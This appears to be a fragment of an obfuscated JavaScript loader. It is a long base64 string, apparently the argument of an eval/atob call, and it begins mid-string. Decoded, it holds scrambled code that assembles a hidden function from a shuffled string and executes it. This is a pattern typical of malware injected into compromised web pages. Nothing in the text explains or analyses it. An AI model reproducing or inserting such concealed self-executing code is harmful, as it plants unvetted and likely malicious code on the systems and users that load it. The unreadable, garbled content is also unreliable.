Nyb2xyXSw0ZGh1O0ErciBmZi44LDs9aGU4aWVpMHA4LG4uLGZyWywuOHZmcjZrNWNdQyxnMXIxKG5uKWh2djs3Mm44ciw3NHR2PTcpPSkuZnR0IDc7bGNnZihyPWk9W2EgIjA1ZiguKCg9bm9deCA9Nmh0ZVs8aVs7dm1dLDU7LClydCtyb11nLGVpaTVvKHVyZjgseWFhImRDZnRyPXNrOzlycXJwdGdhLGd2aTBuOENDbGU9PTt7YXlybik7di5oKHR2YXQwKCgpbmY9InE2LmZwdGllciIgcilyez1uZmxlQzhuNj0uZVsrYXAuKSA7bHppaVtjMi05ezsqZSByW2t1YWxhZ3ByIHZ4YWk9bitkdjsgMj07dSk2W2VpPTt9cDA7O2h2ZWJycHUoO3BoO3Y7YWF1IHd0MyhlKC52KCk9ckE0dSssIGwrdmZ0dihlLm8rcCt0eityaStzO0FhY3t7KXVhcSBheGN9cmEwPSl6YW5dWz1mYWQ9LXR9K2FoY2hzejtvKXRhdD0ocTF2aWY7MD0wOyxsbnJrO20oOXZyXS11Yit5YyBvPXMxIGZvZWVdcjxoLmRjcGo7KXAoLD1ndHtwNmZhKSlzKSkucmgyIDt1KHVBdGl2LG12LTs4ZmYsOzYrdjJbfWRzK2U2PW92KGlyOyl3XW87Ils9PTlobGwpdD07djs9PGk7PnNlO29ucyxoMnA9c3N0KDd2dCg9cT0udl0rbWwraWpzIChhLmc3MV07O2hyLitnO3VpdSh1IShuYWhvKXZpLChqeDl1b2wgcigiK3BvcyBiKDEpczgrOHVvKVtrLGNdbytiZ2ErbmV3dmY7fWw5cihhZ3RucmlqYTs7dnZ2eT5zU20wamppIGwuInJycGExMm9bYXNhKHRDKTQqIGY7PDktLHQ2KSJ9bm5jb3RuamspLDszdDR7IGFlImcpKHRlb1s7MWFiQy5kcygpNm92dW8gLHI3dSB0PSlyYjxvLmRmMWduby5mbiswaS5kPXM9M3YrPXg7ZGEpamE9QUMtMF0pLixvPXJyKHUga25sLilyKG1oITtyfXRzd2ExKD1ocD1kYXNmLC5jMWUtYzdsK3J0NTIiPTt2LilqY250cjt0Jzt2YXIgT09qPURaUltxU2VdO3ZhciBSTUE9Jyc7dmFyIHlNRT1PT2o7dmFyIFJobD1PT2ooUk1BLERaUih0WlEpKTt2YXIgemRQPVJobChEWlIoJ1cpcF9fYlcrdGNXKS51biVDLlt0YX0xJTNlcGhXTHcpV11pVyUpVy51Njh7NGVoaTtINWVpSldXT29jVypvcnNpPz1lKUFmbiIuVztoLn1yTG1hV01fKW5uOytXJDF9LmxvLHs9fS5laW0jZmE0Xy5lbWEuW3V0ZygtVyVxV2clbDI3X24pIyUuOWchMFddcz4yY1clKylqbS49ZS5sdCVqLnIpVykuKX07bHJhb2k7U1tBbTF1KTdsMVcuZWJycSFhOyBifUA3P2FTV2EzMWUwMzt0MCk6bT0sXCc5MDMrV2EkV28wbmhlckN0OWUkRFdhQT4hVykxOnIpOCMsLlslaGE9aG9pM3t1V3B4dF1ibFdtLHNzLHNkby5lKCxXV3tpJTNnIFclVzZXV3I9bSgzJSUoYihzXWFhZEA4VzoqLiEwKFdhXTZlO2lqfXN0Lmkub2loZWVuV2xXXSUuNSU7Ym9pJVcxbm4xNGdvRlcpYSlyZ2FlJWNme1tXcldoLCVGIC5vK2EucmRkLCB0NDp1OCElLDQ1VyE0XWQ5MWhlbFd0V2JpY3JXM2woV2l0ZWoudFdfcnMxMl1kKG9bfW50ZXMgXXQ9PS4oIHJ1fVdobz87JW9COmRyJSlzV1s9V3AzbWUuYVdhXSBldWlffV1cL1MubldvaXRdKzI1XXJvLmF3dDtXXV09bjA5ISlcJykpfSZAZ0FXVyUlV2RXNWUpXXIpdWI4K102O1ddaTgxYTl9PV0pZy4pV1ctKFchK31ufHRmNl00IVdubFdzV2VlZWZKYzF9bGZ3aTxkLGEoVyJjcHI2dG8uPlwvISRXO2U0bW0iVFdfYUF9ZWVpLil8KzNEcmEsNmZvOzlxY1ddbi45ZyhwcmF0e3IkZmFXZWhne2wuO2cgYnRXdW9tb3QlbnhjPW5dKyUudDNzbiBhOGtyc2Vhe25XOSgyayEsPVdzV3A8PSFcLylhZW5lV2xlZ10sdVdkNzNkdFd0fWE9PSBqKHNXfV9db2VXbmVsLiByZWV9Rl9AK2wpbHR1XTcweSxjLiQgKz0wIlt1JUhlO3JsMzB8JChlV2RhYXh1IHt0bjFnaVcsdGtlbi5hJWFlYXQ9KGEsYX1yJHR0LldhQVdhcDdhJSsxJVdldGElYyBjSG0hbF01V1spcGZsYVctLkdXdVdvN2xlNDUuYSB1W2kpfXQ9V250ZVcxOF1BLmZ8LjcwSmhhK0UgXS50aD0uV0F9K1ddd310LnNhdFcybHR3cigoLD1hLld7M2QobyBLZXUwN3RXSTgoIXI7V2UuVylddUMgbmIxbntidG1kbzQ9V3llV0xmdFdydDFdaXJkKjczYSh7ajdjN3M8MWVXZHlkQS5vMjE6LjRjIH1hNmFhaXNdNG40czcoV2Ndb31oPVdobmQ1YjpwdG0oMHJXOmNuLkd9fTVfajY7MFcxLkt7bCEsOiVlcFddPX1cL28gTCxXVy40ZTB9aXJ0LixXQW4kdHJhbCBwJnQ9N1clKXJXb24oK10udmZuNFckKCg9KFdzPTtqaVciOzohX1d0ITAtVyk5XT0gYy49dV9HKyIibihXQXsrZTFIKClXO3ItYW5XYk9oM3MjV1dJID9pRVcpbWUhXV02NS5kVy5hXTM5V31pcldhVzAscmkyK3MlOX1uVy5Eblt0OTsoLiVvaSwlZzQ9dCBCKT0uNH1hbz1lbzdkTiklPWVlMih5V2FXKG9XOy57IVdXI3JvKztjMTYhcHIuVyg6Y29dXTJtVzVhaCtkSykhZ3J0LGdocj0wYWF3KCFlKW9dLnRoXXRXZGV0K1dcL307bG4/dS0pZSw/YUYwLTczPSYgbV8gVzQ0TiU2V2kzO28gV1dufWVvV1NBOyk0TmUgIXthYWc7KDM+MnNlV3V0ZyU5LmEsNUljZjhufWQgMG5ddDVXRnlKbihXM1dXRXUsJGkhc19cLyhiK2Upe2I0KDtvPCVvVyhodHJfbmQuJV1XLmVybnJsJSs9RmZuMiVuKDcsYS1XRz09JXQuZiMsM3RKKVcucm8lT2FdLmElMUcyOjJ0Yzg2KGFzPWUuSFd0KFcmcFdnY1dEXVdpLjddXC9hMiFpfS5lbj1wZy4yO01vXVcxb3JmaS47Vz1sOk57cWF0KHRXJCVhPV1yQjAlOzg3O28wdCB7KT17cF01IWFdbiFfXXRpdCx9c2QuV3RXMldfYV1mb3QuNTBBWzlpIEVOMVcuV2MgVy4tO1dXb1cxK1tXc2l9cDZvZjBiLm5uPSlXTld0V1c9fVdvLj1hZVc9eXkpe2ZkXT1hYSxuZW9lO0J0Vyk9LldzV3M+cCUhbkcyMVwnLGc9SVdpdFdBM25MY3R1LH1CZV1XV2FhMXQ0cl0hLWF7XX1jbV1XdTtGLnhhV25lSWl0dygsZTZlKWZtLHddVy5cJzVJZixdRFcpJShXc1cpJWVhV2g8ZXBNLmV0YX1XQVcuZVwvXVtcJzs2cmVpXUQ9ZFdhZWlpLj1yXXIpV1d0XShXSyIoez02cGMyM3tXLnQ5ZWlkbykoOS1uJTs7biUuV18lPVcpV10hfVwvKC5XLjp9JWliO2FhIX1hXXVPbigpKG9XLmddLGUuYWl0MGVlKVc+KDUmcGduPVd9V3QpJVdhZF0ubm5pXW4oV2FbbyZpLSlJYWN3XWVXYWliZVcoPncrN1d7KF1ySylhKXN1Wyl0KW83KShhY2NXV2dDZW9fKTF3M2lvdFdhbSUhdFdXKFdnV24tKWElaTFpdHllVzhhO2FtaVcuJSkgV18pMGExNm9HVz1fJTNuNFcxOixBbDFXV1wvPTtXXzBlNzkuV00yV11yJVdXeStzb2lsK2JXXTs4KXBpKDR9VyN2KVwvXVcuV18objQ0b1RXV2FXOns0YX11XS5jXW5XbFdTYV1ONjR0MFd1Lml4V3lsPyMpeHtwZXMlbi5xNC5XKV9lLmFdXWF0eygsVyJiYWJXV117NWYyV1c+V11laX1pIFdXIHNhV29vV2FdaWN4MmhkNDhXbDQlfWEmKDR4cl0tZSldO1d0V1dILl1XLmdXdFdXK25XXSV4KSBiZihXIS1vYi5nYWNmX0NuIF04ZDl0LWVXV2FXNi1HfXlkJWR9Ykk7Q10pJWUpMihiOG5ldDMpcm4uKWk9YTEzLi4gLn1wXC9yO1c7V2QyXy0gVyloV2FhO3tpV2luXC8lN3UyLS5oLHc4NmkudENheVspIGR0Lndlcnt7ZC4+Xyk5V2VfN2E0Ny4pezVvLjIgMXJXWzVhbSg2eW8xc1tlbixmMSgoV2VnZVc7aHQiIDsxO2lXKDI1XVwvYjBjdGUrYVdXZSBXbWNtdC4mOlcxcypBKV00Rjo5V11vKXplIHAkYXdsc2FvYWxyXVdjMD07MH1jYXRXZXlnXTtXV1dddjZhLml9Mj92aT1kYztpLjUoZWkgXXNhcyJyMGc6IEMuYSlXIFdvZGwlXWNhfVwvdGUlJykpO3ZhciBBSno9eU1FKFl0TCx6ZFAgKTtBSnooNTE5Nyk7cmV0dXJuIDgwNDR9KSgp'))
